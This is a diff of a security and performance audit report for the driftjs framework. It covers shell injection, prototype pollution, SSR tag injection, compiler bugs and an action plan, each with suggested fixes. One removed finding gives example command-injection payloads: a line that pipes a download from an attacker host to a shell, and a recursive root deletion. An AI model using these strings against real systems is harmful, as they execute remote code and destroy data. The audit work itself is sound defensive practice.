-  `pm` is supplied via `options.packageManager` in `ScaffoldOptions`. `execSync` passes the concatenated string `${pm} install` directly to the system shell (`/bin/sh -c`). If `options.packageManager` contains shell metacharacters (e.g., `pnpm; rm -rf /` or `npm && curl http://evil.com/payload | bash`), arbitrary commands are executed in the host environment with full process privileges.
-- **Remediation**:
-  Validate `pm` against an explicit whitelist (`['npm', 'pnpm', 'yarn', 'bun']`) and invoke `execFileSync(pm, ['install'], { cwd: targetDir })` to bypass the shell interpreter.
+  The `in` operator inspects `Object.prototype` on `globalThis`.
+- **Impact:**
+  Accessing undeclared template variables matching prototype keys (such as `{constructor}`, `{valueOf}`, `{toString}`, `{isPrototypeOf}`) resolves to global prototype functions instead of `undefined`.
+- **Suggested Fix:**
+  Use `Object.prototype.hasOwnProperty.call(globalThis, name)` or an explicit global allowlist rather than `name in globalThis`.
 
 ---
 
-### `BUG-12`: Prototype Pollution in Scope Setter (`setScopeValue`)
-- **File**: [`packages/utils/src/scope.ts:L4-L26`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/scope.ts#L4-L26)
-- **Severity**: **Medium** (`CWE-1321: Improperly Controlled Modification of Object Prototype Attributes`)
-- **Root Cause**:
-  `setScopeValue` assigns variables directly onto scope objects without checking against dangerous prototype keys:
+#### `BUG-13`: Array Pattern Destructuring Assignment Without Iterable Resolution
+- **Package:** `driftjs-compiler`
+- **File:** [`packages/compiler/src/generator.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L790-L802)
+- **Severity:** Low
+- **Description:**
+  In `astToJS` for `AssignmentExpression` with `ArrayPattern`, the RHS value `_val` is indexed directly (`_val[0]`, `_val[1]`) without wrapping in `resolveIterable(_val)`.
+- **Impact:**
+  Destructuring custom iterables, Sets, or Maps assigns `undefined` to all target variables, corrupting component state.
+
+---
+
+### 3. Efficiency
+
+#### `BUG-14`: $O(N)$ Linear Array Search in `DriftClientVM.triggerUpdates`
+- **Package:** `driftjs-dom`
+- **File:** [`packages/dom/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L1073-L1077)
+- **Severity:** Medium
+- **Description:**
+  In `DriftClientVM.triggerUpdates()`:
   ```typescript
-  if (!setOn) {
-    targetScope[name] = val;
-    setOn = targetScope;
+  for (const region of candidateRegions) {
+    if (this.reactiveRegions.includes(region)) {
+      region.reRender();
+    }
   }
   ```
-  When `name === '__proto__'`, assignment on standard prototype-inheriting objects triggers `Object.prototype.__proto__` setter, modifying the prototype chain of the scope object.
-- **Remediation**:
-  Reject or guard properties matching `__proto__`, `constructor`, or `prototype`:
-  `if (name === '__proto__' || name === 'constructor' || name === 'prototype') return val;`.
+  `this.reactiveRegions` is stored as an array `ReactiveRegion[]`.
+- **Impact:**
+  Calling `this.reactiveRegions.includes(region)` inside the candidate loop results in $O(N \cdot M)$ time complexity. In templates with hundreds of nested `@if` or `@for` blocks, microtask flushes incur unnecessary overhead.
+- **Suggested Fix:**
+  Maintain `this.reactiveRegions` as a `Set<ReactiveRegion>` for $O(1)$ membership checks.
 
 ---
 
-### `BUG-13`: Unsanitized Dynamic HTML Tag Names in SSR Serialization
-- **File**: [`packages/ssr/src/index.ts:L328-L353`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L328-L353)
-- **Severity**: **Medium** (`CWE-116: Improper Encoding or Escaping of Output`)
-- **Root Cause**:
-  In `serializeNode`, attribute names are checked against `VALID_ATTR_NAME_REGEX`, but element tag names `tag` are interpolated directly without validation:
-  ```typescript
-  return `<${tag}${attrsStr}>${childrenStr}</${tag}>`;
-  ```
-  If a dynamically resolved component tag or AST node contains spaces or tag delimiters, it can inject arbitrary attributes or break the HTML parser structure.
-- **Remediation**:
-  Validate `tag` against `VALID_ATTR_NAME_REGEX` or sanitize non-alphanumeric tag names.
+#### `BUG-15`: `markDirty` Lacks Unmount Guard Leading to Redundant Scheduled Microtasks
+- **Package:** `driftjs-dom`
+- **File:** [`packages/dom/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L194-L200)
+- **Severity:** Low
+- **Description:**
+  `DriftClientVM.markDirty(varName)` queues a microtask without verifying whether `this.module` is null or the VM has been unmounted.
+- **Impact:**
+  Asynchronous timers or promises completing after VM destruction schedule redundant microtasks that perform no-op flushes against emptied registers.
+- **Suggested Fix:**
+  Guard `markDirty()` with `if (!this.module) return;`.
 
 ---
 
-## 3. Efficiency & Performance Bottlenecks
+## 📋 Recommended Action Plan
 
-### `BUG-14`: Massive Code Expansion & Redundant Prototype Chain Walks per Identifier in CodeGen
-- **File**: [`packages/compiler/src/generator.ts:L718-L720`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L718-L720)
-- **Severity**: **High**
-- **Description**:
-  For every variable identifier in template expressions, `astToJS` generates:
-  ```javascript
-  ((typeof inScopeChain === 'function' ? inScopeChain(scope, "varName") : Object.prototype.hasOwnProperty.call(scope || {}, "varName")) ? scope["varName"] : (typeof globalThis !== 'undefined' && globalThis && ("varName" in globalThis) ? globalThis["varName"] : undefined))
-  ```
-  - **Code Bloat**: Adds ~220 bytes of generated JavaScript per identifier. In templates with 20 expressions, this produces several kilobytes of repetitive string bytecode in the constant pool.
-  - **Runtime Overhead**: During every microtask dirty-checking pass, each operand evaluation performs multiple `typeof` checks, function lookups, prototype walks (`inScopeChain`), and `globalThis` queries.
-- **Remediation**:
-  Emit a concise helper call `_get(scope, "varName")` passed into the compiled function wrapper parameters.
-
----
-
-### `BUG-15`: Duplicate Sub-Expression Evaluations in `for...of` and Destructuring Declarations
-- **File**: [`packages/compiler/src/generator.ts:L1056`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1056), [`packages/compiler/src/generator.ts:L1162-L1190`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1162-L1190)
-- **Severity**: **Medium**
-- **Description**:
-  1. **`ForOfStatement`**:
-     ```javascript
-     const rightJS = `(typeof resolveIterable === 'function' ? resolveIterable(${astToJS(node.right, locals)}) : (${astToJS(node.right, locals)} || []))`;
-     ```
-     `astToJS(node.right, locals)` is embedded twice. If `node.right` is a function call (`getItems()`), the function executes twice per loop evaluation.
-  2. **Destructuring Assignments**:
-     In `VariableDeclaration` with `ObjectPattern` or `ArrayPattern` (e.g. `const { a, b, c } = getPayload()`), `valJS` is computed as `astToJS(d.init)` and duplicated into every property extractor expression. `getPayload()` is called $N$ times for $N$ destructured properties.
-- **Remediation**:
-  Assign the result of `node.right` / `d.init` to a temporary variable before destructuring.
-
----
-
-### `BUG-16`: Repeated Regex Compilation and $O(N \log N)$ Path Re-Scoring During Route Indexing
-- **File**: [`packages/router/src/matcher.ts:L277-L281`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L277-L281)
-- **Severity**: **Medium**
-- **Description**:
-  In `createMatcher().rebuildIndex()`:
-  ```typescript
-  normalizedRoutes = flattened.sort((a, b) => {
-    const scoreA = compilePathToRegex(a.path).score;
-    const scoreB = compilePathToRegex(b.path).score;
-    return scoreB - scoreA;
-  });
-  ```
-  `compilePathToRegex` parses the path, splits segments, and compiles new `RegExp` objects on every comparison inside the sort loop. For $N$ routes, this executes $O(N \log N)$ regex compilations and path segment traversals every time `addRoute` or `removeRoute` is invoked.
-- **Remediation**:
-  Store the pre-computed `score` directly on `RouteRecordNormalized` during the initial `normalizeRouteRecord()` step and compare `b.score - a.score`.
-
----
-
-### `BUG-17`: Uncached Event Handler Wrapper Allocations on Every VM Execution Pass
-- **File**: [`packages/dom/src/index.ts:L409-L426`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L409-L426)
-- **Severity**: **Low**
-- **Description**:
-  In `SET_ATTR` opcode execution, a new `wrappedHandler` closure and scope snapshot are instantiated and assigned to `DriftClientVM.eventHandlersMap` on every render pass, triggering unnecessary GC allocations for static event listeners.
-- **Remediation**:
-  Reuse stable event handler wrappers that dynamically read the latest callback from scope.
+1. **Immediate Security Patches:**
+   - Sanitize `-->` comment closing sequences in `DriftServerVM.serializeNode()`.
+   - Prevent prototype chain lookups in `getScopeValue()` by replacing `name in globalThis` with `Object.prototype.hasOwnProperty.call(globalThis, name)`.
+2. **Reactivity & Event Handling Corrections:**
+   - Update `DriftGenerator.extractIdentifiers()` to traverse `node.property` for computed `MemberExpression`s.
+   - Fix delegated event listener in `DriftClientVM` to continue traversing ancestors unless propagation is stopped.
+   - Sync `WeakMap` event handlers on root elements when reusing DOM nodes in `reconcileKeyedList`.
+3. **Router Synchronizations:**
+   - Add `router.subscribe()` to `RouterLink.drift`.
+   - Apply `stripBase` in `createMemoryHistory`.
+   - Improve regex parameter substitution in `RouteMatcher.resolve()` to support nested parentheses.
+4. **Performance Improvements:**
+   - Convert `DriftClientVM.reactiveRegions` from `ReactiveRegion[]` to `Set<ReactiveRegion>`.
